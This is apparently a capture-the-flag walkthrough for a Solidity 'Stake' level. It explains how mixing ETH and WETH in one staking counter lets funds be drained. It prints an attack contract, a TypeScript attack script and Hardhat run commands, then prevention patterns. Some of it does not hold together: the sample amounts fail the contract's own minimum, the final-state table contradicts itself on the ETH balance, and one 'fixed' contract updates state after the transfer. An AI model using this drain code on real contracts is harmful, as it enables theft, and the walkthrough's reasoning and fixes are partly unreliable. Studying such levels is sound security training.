# Level 31: Stake Challenge

## Challenge Description

Stake is safe for staking native ETH and ERC20 WETH, considering the same 1:1 value of the tokens. Can you drain the contract?

To complete this level, the contract state must meet the following conditions:

1. The Stake contract's ETH balance has to be greater than 0.
2. `totalStaked` must be greater than the Stake contract's ETH balance.
3. You must be a staker.
4. Your staked balance must be 0.

**Things that might be useful:**
- ERC-20 specification
- OpenZeppelin contracts

## Contract Location

The challenge contracts are located at:
```
/contracts/level-31-stake/Stake.sol
/contracts/level-31-stake/WETH.sol
```

## Understanding the Challenge

The Stake contract allows users to stake both native ETH and WETH (Wrapped Ether) tokens. The contract treats them as having the same 1:1 value and tracks them together in `totalStaked`. However, this creates a critical accounting vulnerability.

### The Stake Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Stake {
    uint256 public totalStaked;
    mapping(address => uint256) public UserStake;
    mapping(address => bool) public Stakers;
    address public WETH;

    constructor(address _weth) payable {
        totalStaked += msg.value;
        WETH = _weth;
    }

    function StakeETH() public payable {
        require(msg.value > 0.001 ether, "Don't be cheap");
        totalStaked += msg.value;
        UserStake[msg.sender] += msg.value;
        Stakers[msg.sender] = true;
    }

    function StakeWETH(uint256 amount) public returns (bool) {
        require(amount > 0.001 ether, "Don't be cheap");
        (,bytes memory allowance) = WETH.call(abi.encodeWithSelector(0xdd62ed3e, msg.sender, address(this)));
        require(bytesToUint(allowance) >= amount, "How am I moving the funds honey?");
        totalStaked += amount;
        UserStake[msg.sender] += amount;
        (bool transfered, ) = WETH.call(abi.encodeWithSelector(0x23b872dd, msg.sender, address(this), amount));
        Stakers[msg.sender] = true;
        return transfered;
    }

    function Unstake(uint256 amount) public returns (bool) {
        require(UserStake[msg.sender] >= amount, "Don't be greedy");
        UserStake[msg.sender] -= amount;
        totalStaked -= amount;
        (bool success, ) = payable(msg.sender).call{value : amount}("");
        return success;
    }

    function bytesToUint(bytes memory data) internal pure returns (uint256) {
        require(data.length >= 32, "Data length must be at least 32 bytes");
        uint256 result;
        assembly {
            result := mload(add(data, 0x20))
        }
        return result;
    }
}
```

### Key Components

1. **totalStaked**: Tracks the total amount staked (both ETH and WETH combined)
2. **UserStake**: Maps each user's total stake amount
3. **Stakers**: Maps whether an address is a staker
4. **WETH**: Address of the WETH token contract
5. **StakeETH()**: Stakes native ETH
6. **StakeWETH()**: Stakes WETH tokens
7. **Unstake()**: Withdraws staked amount

### The Win Conditions

To pass this level, you must achieve all of these simultaneously:
1. ✅ Contract's ETH balance > 0
2. ✅ `totalStaked` > Contract's ETH balance
3. ✅ You are a staker (`Stakers[msg.sender] = true`)
4. ✅ Your staked balance = 0 (`UserStake[msg.sender] = 0`)

The paradox: How can the contract have ETH, but `totalStaked` be greater than the ETH balance, while you have zero stake but are still a staker?

## The Vulnerability

The vulnerability lies in **mixing different asset types with unified accounting**.

### The Critical Flaw

**The Problem:**
1. `StakeWETH()` receives WETH tokens (ERC20) and increases `totalStaked`
2. `StakeETH()` receives native ETH and increases `totalStaked`
3. Both increase the SAME counter (`totalStaked`)
4. But only ETH staking increases the contract's ETH balance!
5. `Unstake()` ALWAYS sends native ETH, regardless of what you staked!

### Understanding the Accounting Mismatch

```
When you stake WETH:
┌─────────────────────────────────────────┐
│ StakeWETH(1 ETH worth of WETH)          │
├─────────────────────────────────────────┤
│ totalStaked: +1 ETH                     │
│ Contract's ETH balance: +0 ETH (!)      │
│ Contract's WETH balance: +1 WETH        │
│ Your UserStake: +1 ETH                  │
└─────────────────────────────────────────┘

When you stake ETH:
┌─────────────────────────────────────────┐
│ StakeETH() with 1 ETH                   │
├─────────────────────────────────────────┤
│ totalStaked: +1 ETH                     │
│ Contract's ETH balance: +1 ETH          │
│ Your UserStake: +1 ETH                  │
└─────────────────────────────────────────┘

When you unstake:
┌─────────────────────────────────────────┐
│ Unstake(1 ETH)                          │
├─────────────────────────────────────────┤
│ totalStaked: -1 ETH                     │
│ Contract's ETH balance: -1 ETH (!)      │
│ Sends: Native ETH, not WETH!            │
│ Your UserStake: -1 ETH                  │
└─────────────────────────────────────────┘
```

**The Exploit:**
- Stake WETH → `totalStaked` increases, ETH balance doesn't
- Stake ETH → Both increase
- Unstake → ETH balance decreases, creates mismatch
- Result: `totalStaked` > ETH balance!

### Visual Representation

```
Attack Sequence:
┌─────────────┬──────────────┬──────────────┬─────────────┐
│ Action      │ totalStaked  │ ETH Balance  │ User Stake  │
├─────────────┼──────────────┼──────────────┼─────────────┤
│ Initial     │ 0.001        │ 0.001        │ 0           │
├─────────────┼──────────────┼──────────────┼─────────────┤
│ StakeWETH   │ 0.002        │ 0.001        │ 0.001       │
│ (0.001)     │              │ (no change!) │             │
├─────────────┼──────────────┼──────────────┼─────────────┤
│ StakeETH    │ 0.003        │ 0.002        │ 0.002       │
│ (0.001)     │              │              │             │
├─────────────┼──────────────┼──────────────┼─────────────┤
│ Unstake     │ 0.002        │ 0.001        │ 0.001       │
│ (0.001)     │              │              │             │
├─────────────┼──────────────┼──────────────┼─────────────┤
│ Unstake     │ 0.001        │ ~0           │ 0           │
│ (0.001)     │              │              │             │
└─────────────┴──────────────┴──────────────┴─────────────┘

Final State:
✅ ETH Balance > 0 (0.001 from initial deployment)
✅ totalStaked (0.001) > ETH Balance (~0)
✅ You are a staker (set by StakeWETH/StakeETH)
✅ Your stake = 0 (fully unstaked)
```

## The Exploit: Asset Type Confusion

### The Key Insight

**The contract assumes WETH and ETH are interchangeable, but they're not!**

- WETH is an ERC20 token
- ETH is the native blockchain currency
- They have 1:1 value economically
- But they're completely different assets technically!

The contract's mistake:
1. Tracks both in the same `totalStaked` variable
2. Doesn't track which asset type each user staked
3. `Unstake()` always sends ETH, even if you staked WETH
4. Creates accounting mismatch between `totalStaked` and actual ETH balance

### Attack Strategy

```
Step 1: Get WETH Tokens
├─ Deposit ETH to WETH contract
└─ Receive WETH ERC20 tokens

Step 2: Approve Stake Contract
├─ WETH.approve(StakeAddress, amount)
└─ Allow Stake to transfer your WETH

Step 3: Stake WETH
├─ Stake.StakeWETH(0.001001 ether)
├─ totalStaked increases by 0.001001
├─ Contract receives WETH tokens (not ETH!)
├─ Contract's ETH balance unchanged ⚠️
└─ You become a staker

Step 4: Stake ETH
├─ Stake.StakeETH{value: 0.001001}()
├─ totalStaked increases by 0.001001
├─ Contract's ETH balance increases
└─ Ensures contract has ETH > 0

Step 5: Unstake Partial
├─ Stake.Unstake(0.001001)
├─ Sends 0.001001 ETH to you
├─ totalStaked decreases by 0.001001
├─ Contract's ETH balance decreases
└─ Creates mismatch!

Step 6: Unstake Remaining
├─ Stake.Unstake(0.001001)
├─ Sends remaining ETH to you
├─ totalStaked decreases by 0.001001
├─ Your stake becomes 0
└─ Win conditions met!
```

## Solution Approach

### Method 1: Using Attack Contract

Deploy and use the `StakeAttack` contract:

```solidity
contract StakeAttack {
    IStake public target;
    IERC20 public weth;
    
    function attack() external payable {
        // 1. Get WETH
        weth.deposit{value: 0.001001 ether}();
        
        // 2. Approve Stake
        weth.approve(address(target), 0.001001 ether);
        
        // 3. Stake WETH (increases totalStaked, not ETH balance)
        target.StakeWETH(0.001001 ether);
        
        // 4. Stake ETH (ensures contract has ETH)
        target.StakeETH{value: 0.001001 ether}();
        
        // 5. Unstake everything (drains ETH, creates mismatch)
        target.Unstake(0.002002 ether);
    }
}
```

### Method 2: Direct Script Interaction

Execute the attack directly from a script:

```typescript
// 1. Get WETH
await wethContract.deposit({value: ethers.parseEther("0.001001")});

// 2. Approve
await wethContract.approve(stakeAddress, ethers.parseEther("0.001001"));

// 3. Stake WETH
await stakeContract.StakeWETH(ethers.parseEther("0.001001"));

// 4. Stake ETH
await stakeContract.StakeETH({value: ethers.parseEther("0.001001")});

// 5. Unstake all
await stakeContract.Unstake(userStake);
```

## Technical Deep Dive

### 1. WETH vs Native ETH

**WETH (Wrapped Ether):**
- ERC20 token representing ETH
- 1 WETH = 1 ETH in value
- Can be traded like any ERC20 token
- Requires `approve()` and `transferFrom()`
- Stored in contract's token balance

**Native ETH:**
- Blockchain's native currency
- Sent with `msg.value`
- Transferred with `call{value: }` or `transfer()`
- Stored in contract's ETH balance (`address(this).balance`)

**Key Difference:**
- WETH tokens != Native ETH in accounting
- Contract can hold both simultaneously
- Each has separate balance
- Must track them separately!

### 2. The StakeWETH Function

```solidity
function StakeWETH(uint256 amount) public returns (bool) {
    require(amount > 0.001 ether, "Don't be cheap");
    
    // Check allowance
    (,bytes memory allowance) = WETH.call(
        abi.encodeWithSelector(0xdd62ed3e, msg.sender, address(this))
    );
    require(bytesToUint(allowance) >= amount, "How am I moving the funds honey?");
    
    // ⚠️ Increases totalStaked (tracking ETH + WETH together)
    totalStaked += amount;
    UserStake[msg.sender] += amount;
    
    // Transfer WETH tokens (not ETH!)
    (bool transfered, ) = WETH.call(
        abi.encodeWithSelector(0x23b872dd, msg.sender, address(this), amount)
    );
    
    Stakers[msg.sender] = true;
    return transfered;
}
```

**Function Selectors Used:**
- `0xdd62ed3e` = `allowance(address,address)`
- `0x23b872dd` = `transferFrom(address,address,uint256)`

**The Problem:**
- Increases `totalStaked` as if it received ETH
- Actually receives WETH tokens (ERC20)
- Contract's ETH balance (`address(this).balance`) unchanged
- Creates accounting discrepancy

### 3. The Unstake Function

```solidity
function Unstake(uint256 amount) public returns (bool) {
    require(UserStake[msg.sender] >= amount, "Don't be greedy");
    
    UserStake[msg.sender] -= amount;
    totalStaked -= amount;
    
    // ⚠️ ALWAYS sends native ETH!
    (bool success, ) = payable(msg.sender).call{value : amount}("");
    return success;
}
```

**The Problem:**
- Always sends native ETH
- Doesn't check if user staked ETH or WETH
- Doesn't have logic to return WETH tokens
- Assumes contract has enough ETH
- No solvency check!

**Result:**
- User stakes WETH → contract gets tokens, not ETH
- User unstakes → contract sends ETH
- Contract becomes insolvent!

### 4. The Accounting Vulnerability

**Proper Accounting Would Be:**
```solidity
// Separate tracking
uint256 public totalStakedETH;
uint256 public totalStakedWETH;
mapping(address => uint256) public userStakeETH;
mapping(address => uint256) public userStakeWETH;
```

**Current Vulnerable Accounting:**
```solidity
// Mixed tracking
uint256 public totalStaked;  // ETH + WETH together!
mapping(address => uint256) public UserStake;  // Combined!
```

**The Issue:**
```
totalStaked = Sum of all ETH staked + Sum of all WETH staked
address(this).balance = Only the ETH part

Therefore: totalStaked can be > address(this).balance!
```

### 5. Low-Level Calls and Risks

The contract uses low-level calls for WETH interaction:

```solidity
(,bytes memory allowance) = WETH.call(abi.encodeWithSelector(...));
(bool transfered, ) = WETH.call(abi.encodeWithSelector(...));
```

**Problems:**
1. No interface type checking
2. Return data not properly validated
3. Could interact with malicious contract
4. Less readable and maintainable

**Better Approach:**
```solidity
IERC20 wethToken = IERC20(WETH);
uint256 allowance = wethToken.allowance(msg.sender, address(this));
require(allowance >= amount, "Insufficient allowance");
bool success = wethToken.transferFrom(msg.sender, address(this), amount);
require(success, "Transfer failed");
```

## Prevention Strategies

### 1. Separate Asset Accounting

```solidity
// GOOD: Track each asset separately
contract StakeSafe {
    uint256 public totalStakedETH;
    uint256 public totalStakedWETH;
    
    mapping(address => uint256) public userStakeETH;
    mapping(address => uint256) public userStakeWETH;
    
    function stakeETH() public payable {
        totalStakedETH += msg.value;
        userStakeETH[msg.sender] += msg.value;
    }
    
    function stakeWETH(uint256 amount) public {
        IERC20(WETH).transferFrom(msg.sender, address(this), amount);
        totalStakedWETH += amount;
        userStakeWETH[msg.sender] += amount;
    }
    
    function unstakeETH(uint256 amount) public {
        require(userStakeETH[msg.sender] >= amount);
        userStakeETH[msg.sender] -= amount;
        totalStakedETH -= amount;
        payable(msg.sender).transfer(amount);
    }
    
    function unstakeWETH(uint256 amount) public {
        require(userStakeWETH[msg.sender] >= amount);
        userStakeWETH[msg.sender] -= amount;
        totalStakedWETH -= amount;
        IERC20(WETH).transfer(msg.sender, amount);
    }
}
```

### 2. Don't Mix Asset Types

```solidity
// BAD: Single function for withdrawal
function Unstake(uint256 amount) public {
    // Which asset should be returned?
}

// GOOD: Separate functions
function unstakeETH(uint256 amount) public { /* return ETH */ }
function unstakeWETH(uint256 amount) public { /* return WETH */ }
```

### 3. Validate Solvency

```solidity
function Unstake(uint256 amount) public {
    require(UserStake[msg.sender] >= amount, "Insufficient stake");
    
    // ✅ Check contract has enough ETH
    require(address(this).balance >= amount, "Contract insolvent");
    
    UserStake[msg.sender] -= amount;
    totalStaked -= amount;
    
    (bool success, ) = payable(msg.sender).call{value: amount}("");
    require(success, "Transfer failed");
}
```

### 4. Use Proper Interfaces

```solidity
// BAD: Low-level calls with selectors
(,bytes memory allowance) = WETH.call(
    abi.encodeWithSelector(0xdd62ed3e, msg.sender, address(this))
);

// GOOD: Use interface
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

IERC20 wethToken = IERC20(WETH);
uint256 allowance = wethToken.allowance(msg.sender, address(this));
```

### 5. Track Asset Types

```solidity
enum AssetType { ETH, WETH }

mapping(address => AssetType) public stakedAssetType;
mapping(address => uint256) public stakedAmount;

function Unstake(uint256 amount) public {
    require(stakedAmount[msg.sender] >= amount);
    
    if (stakedAssetType[msg.sender] == AssetType.ETH) {
        payable(msg.sender).transfer(amount);
    } else {
        IERC20(WETH).transfer(msg.sender, amount);
    }
    
    stakedAmount[msg.sender] -= amount;
}
```

### 6. Comprehensive Testing

Test scenarios:
- Stake only ETH, unstake ETH
- Stake only WETH, unstake
- Mix: stake both, unstake
- Edge case: try to unstake more WETH than available ETH
- Verify: `totalStaked <= address(this).balance + WETH.balanceOf(this)`

## Deployment and Execution

### Step 1: Deploy the Challenge Contracts

```bash
npx hardhat deploy --tags level-31 --network sepolia
```

Or deploy separately:
```bash
npx hardhat deploy --tags stake --network sepolia
```

### Step 2: Deploy the Attack Contract

With environment variable:
```bash
STAKE_ADDRESS=0xYourAddress \
  npx hardhat deploy --tags stake-solution --network sepolia
```

Or deploy both together:
```bash
npx hardhat deploy --tags level-31 --network sepolia
```

### Step 3: Execute the Attack

**Method A: Using the attack contract:**
```bash
ATTACK_CONTRACT_ADDRESS=0xYourAttackAddress \
TARGET_ADDRESS=0xStakeAddress \
  npx hardhat run scripts/level-31-stake/attack.ts --network sepolia
```

**Method B: Direct script execution:**
```bash
TARGET_ADDRESS=0xStakeAddress \
  npx hardhat run scripts/level-31-stake/attack.ts --network sepolia
```

## Common Pitfalls

### 1. Not Understanding WETH

**Mistake:** Thinking WETH automatically converts to ETH
```solidity
// User stakes WETH
contract.StakeWETH(amount);
// ❌ Doesn't add to contract's ETH balance!
```

**Fix:** Understand WETH is a separate ERC20 token

### 2. Mixing Balances

**Mistake:** Assuming `totalStaked` equals ETH balance
```solidity
// ❌ These can be different!
totalStaked != address(this).balance
```

**Fix:** Track ETH and WETH separately

### 3. Not Checking Solvency

**Mistake:** Unstaking without checking ETH balance
```solidity
function Unstake(uint256 amount) public {
    // ❌ No check if contract has enough ETH!
    payable(msg.sender).transfer(amount);
}
```

**Fix:** Always validate contract has sufficient balance

### 4. Using Wrong Return Type

**Mistake:** Not properly handling return values from WETH calls
```solidity
(bool transfered, ) = WETH.call(...);
// ❌ Doesn't check transfered value!
return transfered;
```

**Fix:** Properly validate and handle return values

## Real-World Implications

### Historical Incidents

This type of vulnerability has appeared in real protocols:

1. **Accounting Mismatches**: Multiple DeFi protocols have had issues mixing different asset representations
2. **Wrapped Token Issues**: Confusion between wrapped and native tokens
3. **Solvency Crises**: Protocols becoming insolvent due to poor accounting

### Impact

- **Fund Loss**: Users can drain contract funds
- **Insolvency**: Contract can't honor all withdrawal requests
- **Loss of Trust**: Users lose confidence in protocol
- **Financial Loss**: Legitimate users can't withdraw

## Key Lessons

### 1. Asset Type Segregation

✅ **What We Learned:**
- Different assets must have separate accounting
- WETH ≠ ETH (even though 1:1 value)
- Don't mix asset types in same tracking variable
- Each asset type needs its own storage

### 2. Withdrawal Logic Must Match Deposit

✅ **What We Learned:**
- If user deposits WETH, return WETH
- If user deposits ETH, return ETH
- Can't substitute one for the other
- Track what was deposited per user

### 3. Solvency Validation

✅ **What We Learned:**
- Always check contract can fulfill withdrawal
- Validate: `totalStaked <= actualBalances`
- Don't allow withdrawals exceeding available funds
- Monitor accounting health

### 4. Proper Interface Usage

✅ **What We Learned:**
- Use typed interfaces instead of low-level calls
- OpenZeppelin's IERC20 is standard
- Type safety prevents many errors
- More readable and maintainable

### 5. Economic vs Technical Equivalence

✅ **What We Learned:**
- 1 WETH = 1 ETH economically ✓
- But WETH ≠ ETH technically!
- ERC20 token vs native currency
- Different handling required

## References

- [ERC-20 Token Standard](https://eips.ethereum.org/EIPS/eip-20)
- [WETH9 Contract](https://etherscan.io/token/0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2)
- [OpenZeppelin ERC20 Documentation](https://docs.openzeppelin.com/contracts/4.x/erc20)
- [Solidity by Example - ERC20](https://solidity-by-example.org/app/erc20/)

## Summary

The Stake level teaches us about:
- ✅ The danger of mixing different asset types in accounting
- ✅ WETH and ETH are different despite 1:1 value
- ✅ Withdrawal logic must match what was deposited
- ✅ Always validate contract solvency
- ✅ Use proper interfaces instead of low-level calls
- ✅ Track asset types separately

**The key takeaway: Never assume different assets are interchangeable in code, even if they have the same value. Each asset type must have separate accounting, separate deposit functions, and separate withdrawal functions. Mixing them creates critical vulnerabilities that can lead to complete fund drainage!**
